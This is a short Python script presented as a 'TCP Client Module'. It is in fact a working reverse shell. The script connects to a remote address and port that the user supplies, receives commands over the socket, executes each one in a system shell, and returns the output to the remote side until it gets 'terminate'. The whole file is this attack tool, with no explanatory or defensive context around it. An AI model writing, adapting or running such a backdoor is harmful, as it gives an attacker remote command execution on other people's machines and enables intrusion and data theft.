#!/usr/bin/env python3

import subprocess
import socket

def Connect(addr,port):
    #
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    #
    s.connect((addr,port))
    #
    while(True):
        #
        command = s.recv(1024)
        #
        if('terminate' in command.decode()):
            #
            s.close()
            #
            break
            #
        else:
            #
            CMD = subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            #
            s.send(CMD.stdout.read())
            #
            s.send(CMD.stderr.read())

def main():
    #
    print("[*] TCP Client Module [*]")
    #
    addr = input("[+] RHOST Address-> ")
    #
    port = int(input("[+] RHOST Port -> "))
    #
    print("[*] Attempting connection to: %s:%s" % (addr,port))
    #
    Connect(addr,port)

if(__name__ == '__main__'):
    #
    main()
